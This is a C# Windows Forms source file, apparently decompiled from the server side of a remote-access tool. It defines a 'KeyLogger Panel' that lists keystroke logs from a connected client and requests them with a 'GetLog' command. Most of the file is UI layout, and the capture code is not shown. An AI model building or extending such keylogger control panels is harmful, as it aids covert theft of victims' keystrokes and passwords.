using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using MaterialSkin;
using Server.Connectings;
using Server.Helper;

namespace Server.Forms;

public class FormKeyLoggerPanel : FormMaterial
{
	public Clients client;

	public Clients parrent;

	private IContainer components;

	private Timer timer1;

	public RichTextBox richTextBox1;

	public DataGridView dataGridView3;

	private DataGridViewTextBoxColumn Column1;

	public FormKeyLoggerPanel()
	{
		base.FormClosing += Closing1;
		InitializeComponent();
	}

	private void FormKeyLoggerPanel_Load(object sender, EventArgs e)
	{
		MaterialSkinManager.Instance.ThemeChanged += ChangeScheme;
		ChangeScheme(this);
		timer1.Start();
		dataGridView3.DoubleClick += dataGridView3_DoubleClick;
	}

	private void ChangeScheme(object sender)
	{
		dataGridView3.ColumnHeadersDefaultCellStyle.SelectionForeColor = FormMaterial.PrimaryColor;
		dataGridView3.ColumnHeadersDefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
		dataGridView3.DefaultCellStyle.SelectionBackColor = FormMaterial.PrimaryColor;
		dataGridView3.DefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
		richTextBox1.ForeColor = FormMaterial.PrimaryColor;
	}

	private void dataGridView3_DoubleClick(object sender, EventArgs e)
	{
		if (dataGridView3.SelectedRows.Count == 0)
		{
			return;
		}
		List<string> list = new List<string>();
		foreach (DataGridViewRow dataGridViewRow in dataGridView3.SelectedRows)
		{
			list.Add((string)dataGridViewRow.Cells[0].Value);
		}
		client.Send(new object[2]
		{
			"GetLog",
			string.Join(",", list.ToArray())
		});
	}

	private void Closing1(object sender, EventArgs e)
	{
		if (client != null)
		{
			client.Disconnect();
		}
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		if (!parrent.itsConnect)
		{
			Close();
		}
		if (client != null && !client.itsConnect)
		{
			Close();
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle3 = new System.Windows.Forms.DataGridViewCellStyle();
		this.timer1 = new System.Windows.Forms.Timer(this.components);
		this.richTextBox1 = new System.Windows.Forms.RichTextBox();
		this.dataGridView3 = new System.Windows.Forms.DataGridView();
		this.Column1 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		((System.ComponentModel.ISupportInitialize)this.dataGridView3).BeginInit();
		base.SuspendLayout();
		this.timer1.Interval = 1000;
		this.timer1.Tick += new System.EventHandler(timer1_Tick);
		this.richTextBox1.BackColor = System.Drawing.Color.White;
		this.richTextBox1.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.richTextBox1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.richTextBox1.Enabled = false;
		this.richTextBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.richTextBox1.ForeColor = System.Drawing.Color.MediumSlateBlue;
		this.richTextBox1.Location = new System.Drawing.Point(203, 64);
		this.richTextBox1.Name = "richTextBox1";
		this.richTextBox1.ReadOnly = true;
		this.richTextBox1.Size = new System.Drawing.Size(594, 486);
		this.richTextBox1.TabIndex = 2;
		this.richTextBox1.Text = "";
		this.dataGridView3.AllowUserToAddRows = false;
		this.dataGridView3.AllowUserToDeleteRows = false;
		this.dataGridView3.AllowUserToResizeColumns = false;
		this.dataGridView3.AllowUserToResizeRows = false;
		this.dataGridView3.BackgroundColor = System.Drawing.Color.White;
		this.dataGridView3.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.dataGridView3.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
		this.dataGridView3.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle.Alignment = System.Windows.Forms.DataGridViewContentAlignment.TopLeft;
		dataGridViewCellStyle.BackColor = System.Drawing.Color.White;
		dataGridViewCellStyle.Font = new System.Drawing.Font("Arial", 9f);
		dataGridViewCellStyle.ForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle.SelectionForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.dataGridView3.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle;
		this.dataGridView3.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.dataGridView3.Columns.AddRange(this.Column1);
		this.dataGridView3.Cursor = System.Windows.Forms.Cursors.Default;
		dataGridViewCellStyle2.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle2.BackColor = System.Drawing.Color.White;
		dataGridViewCellStyle2.Font = new System.Drawing.Font("Arial", 9f);
		dataGridViewCellStyle2.ForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle2.SelectionBackColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle2.SelectionForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle2.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.dataGridView3.DefaultCellStyle = dataGridViewCellStyle2;
		this.dataGridView3.Dock = System.Windows.Forms.DockStyle.Left;
		this.dataGridView3.Enabled = false;
		this.dataGridView3.EnableHeadersVisualStyles = false;
		this.dataGridView3.GridColor = System.Drawing.Color.FromArgb(17, 17, 17);
		this.dataGridView3.Location = new System.Drawing.Point(3, 64);
		this.dataGridView3.Name = "dataGridView3";
		this.dataGridView3.ReadOnly = true;
		this.dataGridView3.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle3.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle3.BackColor = System.Drawing.Color.FromArgb(17, 17, 17);
		dataGridViewCellStyle3.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		dataGridViewCellStyle3.ForeColor = System.Drawing.Color.FromArgb(0, 192, 0);
		dataGridViewCellStyle3.Padding = new System.Windows.Forms.Padding(1, 0, 0, 0);
		dataGridViewCellStyle3.SelectionBackColor = System.Drawing.Color.FromArgb(0, 192, 0);
		dataGridViewCellStyle3.SelectionForeColor = System.Drawing.Color.FromArgb(17, 17, 17);
		dataGridViewCellStyle3.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.dataGridView3.RowHeadersDefaultCellStyle = dataGridViewCellStyle3;
		this.dataGridView3.RowHeadersVisible = false;
		this.dataGridView3.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.dataGridView3.ShowCellErrors = false;
		this.dataGridView3.ShowCellToolTips = false;
		this.dataGridView3.ShowEditingIcon = false;
		this.dataGridView3.ShowRowErrors = false;
		this.dataGridView3.Size = new System.Drawing.Size(200, 486);
		this.dataGridView3.TabIndex = 14;
		this.Column1.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
		this.Column1.HeaderText = "";
		this.Column1.Name = "Column1";
		this.Column1.ReadOnly = true;
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(800, 553);
		base.Controls.Add(this.richTextBox1);
		base.Controls.Add(this.dataGridView3);
		base.Name = "FormKeyLoggerPanel";
		this.Text = "KeyLogger Panel";
		base.Load += new System.EventHandler(FormKeyLoggerPanel_Load);
		((System.ComponentModel.ISupportInitialize)this.dataGridView3).EndInit();
		base.ResumeLayout(false);
	}
}
